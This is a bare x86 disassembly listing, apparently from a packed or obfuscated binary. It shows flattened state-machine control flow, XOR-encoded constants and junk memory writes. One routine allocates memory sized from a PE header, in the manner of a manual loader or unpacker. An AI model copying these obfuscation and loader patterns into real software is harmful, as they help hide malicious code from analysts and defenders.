  4278ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4278ef:	mov    edx,DWORD PTR [ebp-0x28]
  4278f2:	xor    ecx,edi
  4278f4:	lea    ecx,[ecx+edx*1+0x3272f8]
  4278fb:	cmp    eax,ecx
  4278fd:	jb     0x42755b
  427903:	mov    esi,DWORD PTR [ebp+0x14]
  427906:	mov    eax,DWORD PTR [ebp-0x20]
  427909:	mov    DWORD PTR [esi],eax
  42790b:	jmp    0x427952
  42790d:	mov    ecx,DWORD PTR [ebp+0x8]
  427910:	mov    edx,DWORD PTR [ebp+0xc]
  427913:	xor    ecx,edi
  427915:	xor    edx,edi
  427917:	add    ecx,ebx
  427919:	add    edx,ebx
  42791b:	cmp    ecx,edx
  42791d:	jne    0x427931
  42791f:	mov    eax,ds:0x7f642dde
  427924:	imul   eax,eax,0x9f15fcef
  42792a:	mov    ds:0x7f642dde,eax
  42792f:	jmp    0x427952
  427931:	mov    ecx,DWORD PTR [ebp+0x8]
  427934:	xor    ecx,edi
  427936:	add    ecx,ebx
  427938:	cmp    eax,ecx
  42793a:	je     0x427948
  42793c:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  427946:	jmp    0x427952
  427948:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  427952:	pop    edi
  427953:	pop    esi
  427954:	pop    ebx
  427955:	leave  
  427956:	ret    0x18
  427959:	push   ebp
  42795a:	mov    ebp,esp
  42795c:	and    esp,0xfffffff8
  42795f:	mov    eax,DWORD PTR [ebp+0x20]
  427962:	sub    esp,0x14
  427965:	push   ebx
  427966:	mov    ebx,DWORD PTR [ebp+0x14]
  427969:	push   esi
  42796a:	push   edi
  42796b:	cmp    eax,0xf89c85b9
  427970:	jne    0x42797c
  427972:	push   0xf89c85b8
  427977:	jmp    0x427aae
  42797c:	mov    eax,DWORD PTR [ebp+0x20]
  42797f:	cmp    eax,0xf89c85b8
  427984:	jne    0x427990
  427986:	push   0xf89c85bb
  42798b:	jmp    0x427aae
  427990:	mov    eax,DWORD PTR [ebp+0x20]
  427993:	cmp    eax,0xf89c85bb
  427998:	jne    0x4279a4
  42799a:	push   0xf89c85ba
  42799f:	jmp    0x427aae
  4279a4:	mov    eax,DWORD PTR [ebp+0x20]
  4279a7:	cmp    eax,0xf89c85ba
  4279ac:	jne    0x4279b8
  4279ae:	push   0xf89c85bd
  4279b3:	jmp    0x427aae
  4279b8:	mov    ecx,DWORD PTR [ebp+0x20]
  4279bb:	mov    eax,0xf89c85be
  4279c0:	cmp    ecx,eax
  4279c2:	jne    0x427a7e
  4279c8:	mov    eax,DWORD PTR [ebp+0x10]
  4279cb:	mov    DWORD PTR [esp+0xc],eax
  4279cf:	mov    eax,DWORD PTR [ebp+0x18]
  4279d2:	mov    DWORD PTR [esp+0x14],eax
  4279d6:	mov    eax,DWORD PTR [ebp+0xc]
  4279d9:	mov    DWORD PTR [esp+0x18],eax
  4279dd:	mov    eax,DWORD PTR [ebp+0x8]
  4279e0:	mov    DWORD PTR [esp+0x10],eax
  4279e4:	mov    eax,DWORD PTR [esp+0x10]
  4279e8:	mov    ecx,DWORD PTR [esp+0x14]
  4279ec:	mov    edi,0x75108b1
  4279f1:	xor    eax,edi
  4279f3:	mov    esi,0x3272f8
  4279f8:	add    eax,esi
  4279fa:	mov    DWORD PTR [ecx],eax
  4279fc:	mov    eax,DWORD PTR [esp+0xc]
  427a00:	mov    eax,DWORD PTR [eax+0x194]
  427a06:	mov    ecx,DWORD PTR [eax]
  427a08:	mov    eax,DWORD PTR [esp+0xc]
  427a0c:	mov    eax,DWORD PTR [eax+0x194]
  427a12:	mov    eax,DWORD PTR [eax]
  427a14:	add    eax,DWORD PTR [ecx+0x3c]
  427a17:	mov    ecx,DWORD PTR [esp+0xc]
  427a1b:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427a21:	mov    ecx,DWORD PTR [ecx+0x14]
  427a24:	push   0x4
  427a26:	push   0x3000
  427a2b:	push   DWORD PTR [eax+0x50]
  427a2e:	push   0x0
  427a30:	call   ecx
  427a32:	mov    DWORD PTR [ebx],eax
  427a34:	mov    eax,DWORD PTR [esp+0x10]
  427a38:	push   DWORD PTR [esp+0xc]
  427a3c:	xor    eax,edi
  427a3e:	add    eax,esi
  427a40:	mov    DWORD PTR [esp+0x20],eax
  427a44:	lea    eax,[esp+0x20]
  427a48:	push   eax
  427a49:	push   ebx
  427a4a:	push   DWORD PTR [esp+0x20]
  427a4e:	push   DWORD PTR [esp+0x28]
  427a52:	push   DWORD PTR [esp+0x24]
  427a56:	call   0x42741b
  427a5b:	mov    eax,DWORD PTR [esp+0x10]
  427a5f:	mov    ecx,DWORD PTR [ebx]
  427a61:	xor    eax,edi
  427a63:	add    eax,esi
  427a65:	cmp    ecx,eax
  427a67:	je     0x427ac5
  427a69:	mov    eax,DWORD PTR [esp+0x18]
  427a6d:	mov    ecx,DWORD PTR [esp+0x14]
  427a71:	xor    eax,edi
  427a73:	add    eax,esi
  427a75:	imul   eax,DWORD PTR [esp+0x1c]
  427a7a:	mov    DWORD PTR [ecx],eax
  427a7c:	jmp    0x427ac5
  427a7e:	mov    ecx,DWORD PTR [ebp+0x20]
  427a81:	cmp    ecx,0xf89c85bd
  427a87:	jne    0x427a90
  427a89:	push   0xf89c85bc
  427a8e:	jmp    0x427aae
  427a90:	mov    ecx,DWORD PTR [ebp+0x20]
  427a93:	cmp    ecx,0xf89c85bc
  427a99:	jne    0x427aa2
  427a9b:	push   0xf89c85bf
  427aa0:	jmp    0x427aae
  427aa2:	mov    ecx,DWORD PTR [ebp+0x20]
  427aa5:	cmp    ecx,0xf89c85bf
  427aab:	jne    0x427ac5
  427aad:	push   eax
  427aae:	push   DWORD PTR [ebp+0x1c]
  427ab1:	push   DWORD PTR [ebp+0x18]
  427ab4:	push   ebx
  427ab5:	push   DWORD PTR [ebp+0x10]
  427ab8:	push   DWORD PTR [ebp+0xc]
  427abb:	push   DWORD PTR [ebp+0x8]
  427abe:	call   0x427959
  427ac3:	mov    DWORD PTR [ebx],eax
  427ac5:	mov    eax,DWORD PTR [ebx]
  427ac7:	pop    edi
  427ac8:	pop    esi
  427ac9:	pop    ebx
  427aca:	mov    esp,ebp
  427acc:	pop    ebp
  427acd:	ret    0x1c
  427ad0:	push   ebp
  427ad1:	mov    ebp,esp
  427ad3:	sub    esp,0xc
  427ad6:	mov    eax,0xf89c85b9
  427adb:	mov    DWORD PTR [ebp-0x8],eax
  427ade:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  427ae5:	mov    ecx,DWORD PTR [ebp-0x8]
  427ae8:	xor    ecx,0x75108b1
  427aee:	add    ecx,0x3272f8
  427af4:	mov    DWORD PTR [ebp-0x4],ecx
  427af7:	mov    ecx,DWORD PTR [ebp+0xc]
  427afa:	push   eax
  427afb:	mov    DWORD PTR [ebp+0xc],ecx
  427afe:	push   DWORD PTR [ebp+0xc]
  427b01:	lea    eax,[ebp-0x4]
  427b04:	push   DWORD PTR [ebp+0x8]
  427b07:	push   eax
  427b08:	push   DWORD PTR [ebp+0xc]
  427b0b:	push   DWORD PTR [ebp-0xc]
  427b0e:	push   DWORD PTR [ebp-0x8]
  427b11:	call   0x427959
  427b16:	mov    DWORD PTR [ebp-0x4],eax
  427b19:	mov    eax,DWORD PTR [ebp-0x4]
  427b1c:	leave  
  427b1d:	ret    0x8
